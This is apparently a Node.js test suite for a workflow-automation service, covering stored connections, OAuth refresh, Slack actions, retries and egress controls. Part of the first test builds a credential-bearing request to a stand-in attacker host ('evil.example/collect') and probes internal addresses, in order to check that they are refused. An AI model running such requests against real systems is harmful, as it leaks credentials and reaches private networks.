import { before, after, test } from 'node:test';
import assert from 'node:assert/strict';
import { createHmac } from 'node:crypto';
import { harness } from './harness.mjs';
import { connection, deliver, fakeEdge, fakeSecret, jsonResponse, publish, runs, startRun, stepOf, until } from './kit.mjs';

const fake = fakeEdge();
let h;
before(async () => {
  fake.routes.set('crm.example', () => jsonResponse({ ok: true }, 201));
  fake.routes.set('files.example', ({ url }) => url.pathname === '/moved' ? new Response(null, { status: 302, headers: { location: 'http://192.168.1.10/quote.pdf' } })
    : new Response('%PDF-1.4 quote body', { headers: { 'content-type': 'application/pdf', 'content-disposition': 'attachment; filename="quote.pdf"' } }));
  h = await harness('http://127.0.0.1:9', { edge: fake.edge });
});
after(async () => { await h?.close() });
const form = s => new URLSearchParams(s);

test('HTTP-002/EXEC-005: requests use stored connections, map responses, route business failures, read back lost writes and refuse other destinations', async t => {
  const token = fakeSecret('vendor'), records = { r1: { id: 'r1', status: 'new' } };
  let lose = false;
  const pendingResponses = new Set();
  t.after(async () => { await Promise.allSettled([...pendingResponses]); });
  fake.routes.set('api.vendor.example', ({ method, url, headers, body }) => {
    if (headers.authorization !== 'Bearer ' + token) return jsonResponse({ error: 'unauthorized' }, 401);
    if (method === 'PATCH') {
      Object.assign(records.r1, JSON.parse(body));
      // The effect lands before the request deadline, but its acknowledgement
      // arrives too late. Drain this edge fixture before another journey starts.
      if (!lose) return jsonResponse(records.r1);
      const pending = new Promise(resolve => setTimeout(() => resolve(jsonResponse(records.r1)), 1500));
      pendingResponses.add(pending); pending.finally(() => pendingResponses.delete(pending));
      return pending;
    }
    if (url.pathname === '/conflict') return jsonResponse({ error: 'duplicate order' }, 409);
    if (url.pathname === '/forms' || url.pathname === '/uploads') return jsonResponse({ ok: true, type: headers['content-type'] });
    return jsonResponse(records.r1);
  });
  const vendor = await connection(h, { app: 'http', label: 'Vendor', auth_kind: 'bearer', domains: ['api.vendor.example'], secret: { token } });
  const patch = { id: 'patch', type: 'http', connection_id: vendor.id, timeout_ms: 400, input: { method: 'PATCH', url: 'https://api.vendor.example/records/r1', headers: { 'X-Request-Source': 'crank' }, body: { status: '{{trigger.input.status}}' } },
    readback: { url: 'https://api.vendor.example/records/r1', path: 'status', equals: '{{trigger.input.status}}' } };
  const w = await publish(h, 'Vendor update', { trigger: { type: 'manual' }, steps: [patch,
    { id: 'read', type: 'http', connection_id: vendor.id, input: { url: 'https://api.vendor.example/records/r1' } },
    { id: 'apply', type: 'http', connection_id: vendor.id, body_kind: 'form', input: { method: 'POST', url: 'https://api.vendor.example/forms', body: { name: 'Ada', plan: 'pro' } } },
    { id: 'fetch', type: 'file.fetch', input: { url: 'https://files.example/quote.pdf' } },
    { id: 'upload', type: 'http', connection_id: vendor.id, body_kind: 'multipart', input: { method: 'POST', url: 'https://api.vendor.example/uploads', body: { doc: '{{steps.fetch}}', note: 'Signed quote' } } },
    { id: 'conflict', type: 'http', connection_id: vendor.id, business_failures: [409], on_error: 'continue', input: { method: 'POST', url: 'https://api.vendor.example/conflict', body: {} } },
    { id: 'route', type: 'paths', mode: 'exclusive', branches: [{ id: 'failed', when: [[{ field: 'steps.conflict.ok', op: 'boolean.is_false' }]], steps: [{ id: 'escalate', type: 'http', input: { method: 'POST', url: 'https://crm.example/exceptions', body: { status: '{{steps.conflict.status}}' } } }] }] }] });
  const run = await startRun(h, w, { status: 'shipped' });
  assert.equal(run.status, 'succeeded', JSON.stringify(run.error));
  const sent = fake.to('api.vendor.example');
  assert.equal(sent[0].headers['x-request-source'], 'crank'); assert.equal(stepOf(run, 'read').output.body.status, 'shipped');
  assert.equal(sent.find(r => r.url.pathname === '/forms').body, 'name=Ada&plan=pro');
  const upload = sent.find(r => r.url.pathname === '/uploads');
  assert.match(upload.headers['content-type'], /^multipart\/form-data/); assert.match(upload.body, /filename="quote.pdf"/); assert.match(upload.body, /%PDF-1.4 quote body/);
  assert.equal(stepOf(run, 'conflict').output.error.category, 'business'); assert.deepEqual(stepOf(run, 'route').output.matched, ['failed']);
  assert.equal(JSON.parse(fake.to('crm.example').at(-1).body).status, 409);
  assert.ok(!JSON.stringify(run).includes(token), 'no credential in run history');

  lose = true;
  const patches = () => fake.to('api.vendor.example').filter(r => r.method === 'PATCH').length, before = patches();
  const lost = await startRun(h, w, { status: 'delivered' });
  assert.equal(stepOf(lost, 'patch').output.reconciled, true, 'readback by business key before any retry');
  assert.equal(patches(), before + 1);
  const blind = await publish(h, 'Blind patch', { trigger: { type: 'manual' }, steps: [{ ...patch, readback: undefined }] });
  const uncertain = await startRun(h, blind, { status: 'returned' });
  assert.equal(uncertain.status, 'uncertain');
  assert.equal(uncertain.attempts.length, 1); assert.equal(uncertain.attempts[0].error_category, 'network');
  const uncertainHistory = await h.get('workflow-runs?workflow=' + blind.id + '&status=uncertain');
  assert.deepEqual(uncertainHistory.runs.map(r => r.id), [uncertain.id]);
  assert.equal((await h.get('workflow-runs?workflow=' + blind.id + '&status=failed')).runs.length, 0); assert.equal(uncertain.error.category, 'uncertain'); assert.equal(patches(), before + 2, 'no automatic retry after an uncertain write');
  lose = false;

  const elsewhere = await publish(h, 'Exfiltration', { trigger: { type: 'manual' }, steps: [{ id: 'leak', type: 'http', connection_id: vendor.id, input: { url: 'https://evil.example/collect' } }] });
  const leaked = await startRun(h, elsewhere, {});
  assert.equal(leaked.error.category, 'egress'); assert.match(leaked.error.message, /outside the API domains/);
  const internal = await publish(h, 'Internal', { trigger: { type: 'manual' }, steps: [{ id: 'probe', type: 'http', input: { url: 'http://10.1.2.3/admin' } }] });
  assert.equal((await startRun(h, internal, {})).error.category, 'egress');
  const redirected = await publish(h, 'Redirected file', { trigger: { type: 'manual' }, steps: [{ id: 'grab', type: 'file.fetch', input: { url: 'https://files.example/moved' } }, { id: 'store', type: 'http', input: { method: 'POST', url: 'https://crm.example/files', body: { file: '{{steps.grab}}' } } }] });
  const refusedFile = await startRun(h, redirected, {});
  assert.match(refusedFile.error.message, /file fetch failed/);
  assert.ok(!fake.requests.some(r => ['evil.example', '10.1.2.3', '192.168.1.10'].includes(r.url.hostname)), 'no request past a refusal');
  assert.ok(!fake.to('crm.example').some(r => r.url.pathname === '/files'));
});

test('CONN-002: OAuth consent, refresh and accounts per step; secrets never leave the server; restores require reconnecting', async () => {
  const tokens = [], [access1, access2, refresh1, refresh2, clientSecret] = ['access', 'access', 'refresh', 'refresh', 'client'].map(fakeSecret);
  fake.routes.set('api.hubapi.com', ({ url, body, headers }) => {
    if (url.pathname === '/oauth/v1/token') {
      const params = form(body); tokens.push(Object.fromEntries(params));
      return params.get('grant_type') === 'authorization_code' ? jsonResponse({ access_token: access1, refresh_token: refresh1, expires_in: 30, token_type: 'bearer' })
        : jsonResponse({ access_token: access2, refresh_token: refresh2, expires_in: 1800 });
    }
    return jsonResponse({ results: [{ id: '501', email: 'lee@example.com' }], fresh: headers.authorization === 'Bearer ' + access2 });
  });
  await h.post('oauth/apps/hubspot', { client_id: 'hub-client', client_secret: clientSecret });
  const start = await h.post('oauth/start', { app: 'hubspot', label: 'HubSpot sales', scopes: ['crm.objects.contacts.read', 'crm.objects.contacts.write'] }, h.owner, 201);
  const authorize = new URL(start.authorize_url);
  assert.equal(authorize.host, 'app.hubspot.com'); assert.equal(authorize.searchParams.get('scope'), 'crm.objects.contacts.read crm.objects.contacts.write');
  const callback = `oauth/callback?code=auth-code-1&state=${encodeURIComponent(authorize.searchParams.get('state'))}`;
  const hub = await h.get(callback, h.owner, 201);
  assert.deepEqual(hub.scopes, ['crm.objects.contacts.read', 'crm.objects.contacts.write']); assert.equal(hub.auth_kind, 'oauth2');
  assert.equal(tokens[0].code, 'auth-code-1'); assert.equal(tokens[0].redirect_uri, h.origin + '/api/crank/oauth/callback');
  await h.get(callback, h.owner, 400);
  const w = await publish(h, 'Find contacts', { trigger: { type: 'manual' }, steps: [{ id: 'list', type: 'http', connection_id: hub.id, input: { url: 'https://api.hubapi.com/crm/v3/objects/contacts' } }] });
  const run = await startRun(h, w, {});
  assert.equal(tokens[1].grant_type, 'refresh_token'); assert.equal(tokens[1].refresh_token, refresh1);
  assert.equal(stepOf(run, 'list').output.body.fresh, true, 'the token is refreshed before expiry');

  const seen = [], [eastKey, westKey, eastRotated] = ['east', 'west', 'east'].map(fakeSecret);
  fake.routes.set('two.example', ({ headers }) => { seen.push(headers['x-api-key']); return jsonResponse({ ok: true }) });
  const east = await connection(h, { app: 'http', label: 'East account', auth_kind: 'api_key', domains: ['two.example'], secret: { key: eastKey, header: 'x-api-key' } });
  const west = await connection(h, { app: 'http', label: 'West account', auth_kind: 'api_key', domains: ['two.example'], secret: { key: westKey, header: 'x-api-key' } });
  const both = await publish(h, 'Two accounts', { trigger: { type: 'manual' }, steps: [{ id: 'east', type: 'http', connection_id: east.id, input: { url: 'https://two.example/a' } }, { id: 'west', type: 'http', connection_id: west.id, input: { url: 'https://two.example/b' } }] });
  await startRun(h, both, {});
  assert.deepEqual(seen, [eastKey, westKey]);
  await h.post(`connections/${east.id}/rotate`, { secret: { key: eastRotated, header: 'x-api-key' } });
  await startRun(h, both, {});
  assert.equal(seen[2], eastRotated);
  const listed = JSON.stringify(await h.get('connections'));
  for (const secret of [eastKey, westKey, eastRotated, access1, access2, refresh1, refresh2, clientSecret]) assert.ok(!listed.includes(secret), 'a credential never appears in API state');

  const exported = await h.send('/api/crank/data/export', {}, h.owner);
  assert.equal(exported.status, 200, exported.text);
  for (const secret of [eastKey, westKey, eastRotated, access1, access2, refresh1, refresh2, clientSecret]) assert.ok(!exported.text.includes(secret), 'a credential is not exported');
  const other = await harness('http://127.0.0.1:9');
  try {
    await other.post('data/restore', { archive: exported.text, confirm: 'RESTORE' });
    const restored = await other.get('connections');
    assert.ok(restored.length >= 3 && restored.every(c => c.status === 'needs_reconnect'));
    const flows = await other.get('workflows');
    assert.ok(flows.length > 0 && flows.every(f => f.status === 'paused' || f.status === 'draft'), 'restored workflows do not dispatch');
  } finally { await other.close() }
});

const slackSign = (secret, body, t = Math.floor(Date.now() / 1000)) => ({ 'x-slack-request-timestamp': String(t), 'x-slack-signature': 'v0=' + createHmac('sha256', secret).update(`v0:${t}:${body}`).digest('hex'), 'content-type': 'application/json' });
test('CONN-004: Slack posts by channel name and user email, applies search outcomes, finds or creates once, and admits signed events once', async () => {
  const channels = [{ id: 'C01', name: 'general' }, { id: 'C02', name: 'sales' }], posts = [];
  let failUsers = false;
  fake.routes.set('slack.com', ({ url, body }) => {
    const method = url.pathname.replace('/api/', ''), p = form(body);
    if (method === 'auth.test') return jsonResponse({ ok: true, team: 'Acme', user: 'crankbot' });
    if (method === 'conversations.list') return jsonResponse({ ok: true, channels, response_metadata: { next_cursor: '' } });
    if (method === 'conversations.create') { if (channels.some(c => c.name === p.get('name'))) return jsonResponse({ ok: false, error: 'name_taken' }); const c = { id: 'C' + (channels.length + 1), name: p.get('name') }; channels.push(c); return jsonResponse({ ok: true, channel: c }) }
    if (method === 'users.lookupByEmail') {
      if (failUsers) return new Response('upstream', { status: 500 });
      return p.get('email') === 'rep@acme.example' ? jsonResponse({ ok: true, user: { id: 'U01', name: 'rep', profile: { email: 'rep@acme.example' } } }) : jsonResponse({ ok: false, error: 'users_not_found' });
    }
    if (method === 'conversations.open') return jsonResponse({ ok: true, channel: { id: 'D01' } });
    if (method === 'chat.postMessage') { posts.push(Object.fromEntries(p)); return jsonResponse({ ok: true, channel: p.get('channel'), ts: '1700000000.00' + posts.length, message: { text: p.get('text') } }) }
    return jsonResponse({ ok: false, error: 'unknown_method' });
  });
  const slack = await connection(h, { app: 'slack', label: 'Acme Slack', auth_kind: 'bearer', scopes: ['chat:write', 'chat:write.customize', 'im:write', 'users:read.email', 'channels:read', 'channels:manage'], secret: { token: fakeSecret('bot') } });
  assert.deepEqual(await h.post(`connections/${slack.id}/test`), { ok: true, account: 'Acme', user: 'crankbot' });
  const notify = await publish(h, 'Lead alerts', { trigger: { type: 'manual' }, steps: [
    { id: 'post', type: 'slack.send_channel_message', connection_id: slack.id, input: { channel: '#general', text: 'New lead {{trigger.input.name}}', username: 'Crank Bot', icon_emoji: ':robot_face:', mention_emails: ['rep@acme.example'] } },
    { id: 'dm', type: 'slack.send_direct_message', connection_id: slack.id, input: { email: '{{trigger.input.rep}}', text: 'This lead is yours' } }] });
  const run = await startRun(h, notify, { name: 'Harbour Workshop', rep: 'rep@acme.example' });
  assert.equal(run.status, 'succeeded', JSON.stringify(run.error));
  assert.deepEqual([posts[0].channel, posts[0].username, posts[0].text], ['C01', 'Crank Bot', '<@U01> New lead Harbour Workshop']);
  assert.equal(posts[1].channel, 'D01'); assert.equal(stepOf(run, 'post').output.ts, '1700000000.001');

  const search = no_match => ({ trigger: { type: 'manual' }, steps: [{ id: 'who', type: 'slack.find_user_by_email', connection_id: slack.id, no_match, input: { email: '{{trigger.input.email}}' } },
    { id: 'route', type: 'paths', mode: 'exclusive', branches: [{ id: 'missing', when: [[{ field: 'steps.who.outcome', op: 'text.equals', value: 'not found' }]], steps: [] }], fallback: { steps: [] } }] });
  const lookup = await publish(h, 'Owner lookup', search('continue'));
  assert.deepEqual(stepOf(await startRun(h, lookup, { email: 'nobody@acme.example' }), 'route').output.matched, ['missing']);
  assert.equal(stepOf(await startRun(h, lookup, { email: ' Rep@Acme.example ' }), 'who').output.record.id, 'U01', 'emails compare after trimming, case-insensitively');
  const halting = await publish(h, 'Owner lookup (halt)', search('halt')), mails = h.mail.length;
  assert.equal((await startRun(h, halting, { email: 'nobody@acme.example' })).status, 'stopped_by_search');
  assert.equal(h.mail.length, mails, 'a search halt sends no failure notice');
  assert.equal((await startRun(h, lookup, { email: '' })).error.category, 'validation', 'an empty key is a validation error, never a match-all');
  failUsers = true;
  const broken = await startRun(h, lookup, { email: 'rep@acme.example' });
  assert.equal(broken.status, 'failed'); assert.equal(broken.error.category, 'provider', 'a provider error is never "not found"');
  failUsers = false;

  const room = await publish(h, 'Deal room', { trigger: { type: 'manual' }, steps: [{ id: 'room', type: 'slack.find_channel_by_name', connection_id: slack.id, create_if_not_found: {}, input: { name: 'deals-won' } }] });
  assert.equal(stepOf(await startRun(h, room, {}), 'room').output.outcome, 'created');
  assert.equal(stepOf(await startRun(h, room, {}), 'room').output.outcome, 'found');
  assert.equal(channels.filter(c => c.name === 'deals-won').length, 1);

  const secret = fakeSecret('signing');
  const signing = await connection(h, { app: 'webhook', label: 'Slack signing secret', auth_kind: 'signing_secret', secret: { secret } });
  const listener = await publish(h, 'Channel listener', { trigger: { type: 'slack_event', connection_id: slack.id, signing_connection_id: signing.id, event: 'message', channel: 'C01' }, steps: [{ id: 'said', type: 'map', input: { text: '{{trigger.event.text}}' } }] });
  const hookPath = `${h.origin}/hooks/slack/${slack.id}`;
  const challenge = JSON.stringify({ type: 'url_verification', challenge: 'c-123' });
  assert.deepEqual((await deliver(h, hookPath, { method: 'POST', headers: slackSign(secret, challenge), body: challenge })).value, { challenge: 'c-123' });
  const event = (id, extra) => JSON.stringify({ type: 'event_callback', event_id: id, event_time: Math.floor(Date.now() / 1000), team_id: 'T1', event: { type: 'message', channel: 'C01', user: 'U02', text: 'hello', ...extra } });
  for (const body of [event('Ev1'), event('Ev1'), event('Ev2', { bot_id: 'B1' }), event('Ev3', { channel: 'C02' })]) assert.equal((await deliver(h, hookPath, { method: 'POST', headers: slackSign(secret, body), body })).status, 200);
  assert.equal((await deliver(h, hookPath, { method: 'POST', headers: slackSign(fakeSecret('wrong'), event('Ev4')), body: event('Ev4') })).status, 401);
  const heard = await until(async () => { const list = await runs(h, listener); return list.length && list.every(r => r.status === 'succeeded') ? list : null }, 'listener run');
  assert.equal(heard.length, 1, 'one run per event ID; bot messages and other channels start nothing');
});

test('CONN-001: the catalog lists exact native operations and the coverage report classifies an inventory honestly', async () => {
  const catalog = await h.get('catalog');
  const slack = catalog.apps.find(a => a.app === 'slack');
  assert.ok(slack.actions.some(a => a.id === 'send_channel_message') && slack.searches.every(s => s.outcomes.includes('not found')));
  const report = await h.post('coverage', { items: [
    { app: 'Slack', operation: 'send_channel_message' }, { app: 'Slack', operation: 'archive_channel' }, { app: 'HubSpot', operation: 'create_contact' },
    { app: 'Webhooks', operation: 'catch_hook' }, { app: 'Formatter', operation: 'text.split' }, { app: 'Acme Partner Portal', operation: 'sync', public_api: 'partner' }, { app: 'Docs Tool', operation: 'create', public_api: 'openapi' }] });
  assert.deepEqual(report.items.map(i => i.status), ['native', 'agent-buildable', 'agent-buildable', 'native', 'native', 'blocked', 'agent-buildable']);
  const n8n = await h.post('coverage', { n8n: { name: 'Lead flow', nodes: [{ type: 'n8n-nodes-base.webhook' }, { type: 'n8n-nodes-base.if' }, { type: 'n8n-nodes-base.slack', parameters: { resource: 'message', operation: 'post' } }, { type: 'n8n-nodes-base.hubspot', parameters: { resource: 'contact', operation: 'upsert' } }] } });
  assert.deepEqual(n8n.items.map(i => i.status), ['native', 'native', 'native', 'agent-buildable']);
});

test('EXEC-002: two accounts progress independently through 429, backoff, permanent auth and exhausted read failures; attempts retain retry timing', async () => {
  const times = new Map(), sequences = new Map();
  fake.routes.set('retry.vendor.example', ({ headers, url }) => {
    const account = headers.authorization;
    const key = account + url.pathname + url.search, seen = sequences.get(key) ?? 0;
    sequences.set(key, seen + 1);
    times.set(key, [...(times.get(key) ?? []), Date.now()]);
    if (url.pathname === '/pages') return !url.searchParams.has('cursor') ? jsonResponse({ items: [{ id: 'order-1' }], next: 'second' })
      : seen === 0 ? jsonResponse({ error: 'temporary second-page outage' }, 503) : jsonResponse({ items: [{ id: 'order-2' }], next: null });
    if (url.pathname === '/always-unavailable') return jsonResponse({ error: 'maintenance' }, 503);
    if (url.pathname === '/long-wait') return jsonResponse({ error: 'quota exhausted' }, 429, { 'retry-after': '120' });
    if (url.pathname === '/date-wait') return seen === 0 ? jsonResponse({ error: 'rate limited' }, 429, { 'retry-after': new Date(Date.now() + 2500).toUTCString() }) : jsonResponse({ id: 'after-provider-date' });
    if (url.pathname === '/malformed-after') return seen === 0 ? jsonResponse({ error: 'unavailable' }, 503, { 'retry-after': 'later please' }) : jsonResponse({ id: 'after-backoff' });
    if (account === 'Bearer ' + slowToken) return seen === 0 ? jsonResponse({ error: 'rate limited' }, 429, { 'retry-after': '1' })
      : seen === 1 ? jsonResponse({ error: 'transient' }, 503) : jsonResponse({ error: 'invalid credentials' }, 401);
    return jsonResponse({ id: 'healthy-account' });
  });
  const [slowToken, healthyToken] = [fakeSecret('slow-account'), fakeSecret('healthy-account')];
  const accounts = await Promise.all([slowToken, healthyToken].map((token, i) => connection(h, { app: 'http', label: i ? 'Healthy supplier' : 'Throttled supplier', auth_kind: 'bearer', domains: ['retry.vendor.example'], secret: { token } })));
  const workflow = async (account, path) => publish(h, 'Retry policy ' + account.label + path, { trigger: { type: 'manual' }, steps: [{ id: 'read', type: 'http', connection_id: account.id, input: { url: 'https://retry.vendor.example' + path } }] });
  const slow = await workflow(accounts[0], '/records'), healthy = await workflow(accounts[1], '/records');
  const delayed = startRun(h, slow, {});
  await until(() => times.has('Bearer ' + slowToken + '/records'), 'throttled account first request');
  const good = await startRun(h, healthy, {});
  assert.equal(good.status, 'succeeded');
  assert.equal(sequences.get('Bearer ' + slowToken + '/records'), 1, 'another account completes while the first is in backoff');
  const bad = await delayed;
  assert.equal(bad.status, 'failed'); assert.equal(bad.error.category, 'auth');
  assert.deepEqual(bad.attempts.map(a => a.http_status), [429, 503, 401]);
  const at = times.get('Bearer ' + slowToken + '/records');
  assert.ok(at[1] - at[0] >= 1000, 'Retry-After is a lower bound');
  assert.ok(at[2] - at[1] >= 1000, 'a missing header uses growing backoff rather than zero');
  assert.ok(bad.attempts.slice(0, 2).every(a => a.retry_at && a.retry_reason));
  assert.ok(bad.attempts.slice(1).every((a, i) => Date.parse(a.started_at) >= Date.parse(bad.attempts[i].retry_at)));
  await h.restart(); await h.tick();
  assert.equal(sequences.get('Bearer ' + slowToken + '/records'), 3, 'permanent auth errors have no automatic redrive');

  const policy = (await h.get('catalog')).apps.find(a => a.app === 'webhooks').actions.find(a => a.id === 'request').retry_policy;
  const exhausted = await startRun(h, await workflow(accounts[1], '/always-unavailable'), {});
  assert.equal(exhausted.status, 'failed'); assert.equal(exhausted.attempts.length, policy.read_attempts);
  assert.equal(exhausted.error.exhausted, true); assert.ok(exhausted.error.next_owner_action);
  const gaps = exhausted.attempts.slice(0, 2).map(a => Date.parse(a.retry_at) - Date.parse(a.finished_at));
  assert.ok(gaps[0] > 0 && gaps[1] > gaps[0], 'growing backoff schedules are visible in attempts');
  const deadline = await startRun(h, await workflow(accounts[1], '/long-wait'), {});
  assert.equal(deadline.error.category, 'rate_limit'); assert.equal(deadline.error.exhausted, true);
  assert.equal(deadline.attempts.length, 1); assert.ok(Date.parse(deadline.attempts[0].retry_at) - Date.parse(deadline.attempts[0].finished_at) >= 120000, 'the budget ends without capping Retry-After to an earlier send');
  for (const path of ['/date-wait', '/malformed-after']) {
    const result = await startRun(h, await workflow(accounts[1], path), {});
    assert.equal(result.status, 'succeeded'); assert.equal(result.attempts.length, 2);
    assert.ok(Date.parse(result.attempts[1].started_at) >= Date.parse(result.attempts[0].retry_at));
  }
  const paged = await publish(h, 'Retry a later inventory page', { trigger: { type: 'manual' }, steps: [
    { id: 'read', type: 'http', connection_id: accounts[1].id, input: { url: 'https://retry.vendor.example/pages' }, pagination: { kind: 'cursor', items_path: 'items', cursor_path: 'next', max_pages: 2 } },
  ] });
  const pages = await startRun(h, paged, {});
  assert.equal(pages.status, 'succeeded'); assert.deepEqual(stepOf(pages, 'read').output.items, [{ id: 'order-1' }, { id: 'order-2' }]);
  assert.deepEqual(pages.attempts.map(a => a.http_status), [200, 503, 200]);
  assert.ok(pages.attempts[1].retry_at); assert.ok(Date.parse(pages.attempts[2].started_at) >= Date.parse(pages.attempts[1].retry_at));
  const queue = (await h.get('reports/operations')).execution_queue;
  assert.equal(queue.runs.find(r => r.id === exhausted.id).state, 'dead_letter');
  assert.equal(queue.runs.find(r => r.id === deadline.id).state, 'dead_letter');
  await h.mf.dispatchFetch(h.origin + '/setup', { method: 'POST', redirect: 'manual', headers: { origin: h.origin, cookie: h.owner, 'content-type': 'application/x-www-form-urlencoded' }, body: 'confirm=yes' });
  const page = await h.send('/app/workflow-runs/' + exhausted.id, undefined, h.owner);
  assert.equal(page.status, 200); assert.ok(page.text.includes(exhausted.error.next_owner_action), 'exhaustion shows the owner the next action');
  for (const attempt of exhausted.attempts.filter(a => a.retry_at)) assert.ok(page.text.includes(`datetime="${attempt.retry_at}"`), 'attempt history shows the stored earliest retry instant');
});

test('EXEC-002: executor loss during a retry wait retains the original request budget and earliest retry time', async () => {
  let calls = 0;
  fake.routes.set('restart-retry.example', () => { calls++; return jsonResponse({ error: 'temporary outage' }, 503, { 'retry-after': '2' }); });
  const workflow = await publish(h, 'Durable supplier retry', { trigger: { type: 'manual' }, steps: [
    { id: 'read', type: 'http', input: { url: 'https://restart-retry.example/inventory' } },
  ] });
  // Dispose the actual executor after it commits the first response and retry
  // deadline, before its timer fires. Only the provider edge is faked.
  const interrupted = startRun(h, workflow, {}).catch(() => null);
  const waiting = await until(async () => {
    const run = (await runs(h, workflow))[0];
    if (!run) return null;
    const detail = await h.get('workflow-runs/' + run.id);
    return detail.attempts[0]?.retry_at ? detail : null;
  }, 'persisted retry deadline');
  const budget = waiting.attempts[0].budget_started_at, due = waiting.attempts[0].retry_at;
  await h.restart(); await interrupted;
  assert.equal((await h.get('workflow-runs/' + waiting.id)).status, 'running', 'executor loss leaves a lease for Cron to reconcile');
  await h.tick(Date.now() + 6 * 60000);
  const finished = await h.get('workflow-runs/' + waiting.id);
  const maximum = (await h.get('catalog')).apps.find(a => a.app === 'webhooks').actions[0].retry_policy.read_attempts;
  assert.equal(finished.status, 'failed'); assert.equal(finished.error.exhausted, true);
  assert.equal(calls, maximum, 'executor loss does not buy another attempt budget');
  assert.equal(finished.attempts.length, maximum);
  assert.ok(finished.attempts.every(a => a.budget_started_at === budget));
  assert.ok(Date.parse(finished.attempts[1].started_at) >= Date.parse(due), 'restart cannot dispatch before the stored deadline');
});
